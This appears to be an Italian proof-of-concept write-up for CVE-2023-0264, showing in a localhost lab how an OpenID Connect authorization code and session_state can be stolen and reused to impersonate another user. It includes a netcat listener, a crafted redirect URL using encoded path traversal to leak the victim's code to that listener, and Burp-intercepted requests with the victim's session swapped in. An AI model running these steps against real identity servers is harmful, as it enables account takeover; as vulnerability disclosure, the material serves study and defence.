# CVE-2023-0264 User impersonation via stolen UUID code

- creazione di due utenti, `paola` e `mario` per esempio.
- attivazione un listner `$ nc -lvnp 1234`
- autenticazione dell'utente `paola`, l'utente vittima, utilizzando il link descritto nella CVE precedente e qui di seguito riportato:

```shell
https://localhost:4200/realms/winted/protocol/openid-connect/auth?
client_id=winted-web&
redirect_uri=
https%3A%2F%2Flocalhost%3A4200%2Flogin%2f%252E%252E%2fvuln?
url=http%3A%2F%2Flocalhost%3A1234&
response_mode=fragment&
response_type=code&
scope=openid
```
session_state=cf59cacc-d1e2-4be6-a63c-5d98eacc91ca

- cattura e conservazione del `session_state` perché servirà nei passaggi successivi. Questo parametro rappresenta il `session_id` dell'utente vittima, in questo caso l'utente `paola`. Si noti che la parte centrale del parametro `code` coincide con il `session_state` stesso.

```shell
GET /?state=0a1aeed9-19ae-4f77-b59b-5e7bfe9c5bf6&
session_state=231fd8bc-2259-417b-9887-a4dcfb9c8f46&
code=d310bb8c-883c-477c-bff3-5e33922a9169.
231fd8bc-2259-417b-9887-a4dcfb9c8f46.
f4e96ce3-fdb3-412d-8ab3-264dd456e096 HTTP/1.1
Host: localhost:1234
```

- si è effettuato il logout dell'utente `paola`
- si è verificato che non vi erano più nessun cookie salvato
- si è attivato Burp e si è attivato il proxy
- si è effettuato il login come `mario`, l'utente malevolo
- si è provveduto a forwardare tramite Burp tutte le richieste fino ad arrivare alla richiesta qui di seguito riportata:

```shell
GET https://localhost:4200/login?
session_state=050681a9-f5d5-4a5b-9c7e-db1e6571b439&
code=c4dd3ba8-1128-4747-b771-b677e4b8ad0d.
050681a9-f5d5-4a5b-9c7e-db1e6571b439.
f4e96ce3-fdb3-412d-8ab3-264dd456e096
```

- in fine si è proceduto a modificare l'url inserendo il `session_state` della vittima catturato prima:

```shell
GET https://localhost:4200/login?
session_state=<SESSION_STATE_VITTIMA>&
code=c4dd3ba8-1128-4747-b771-b677e4b8ad0d.
<SESSION_STATE_VITTIMA>.f4e96ce3-fdb3-412d-8ab3-264dd456e096
HTTP/1.1
Host: localhost:1234
```

- Il processo termina inviando la richiesta

# Demo

Video demo [qui](https://videolink)
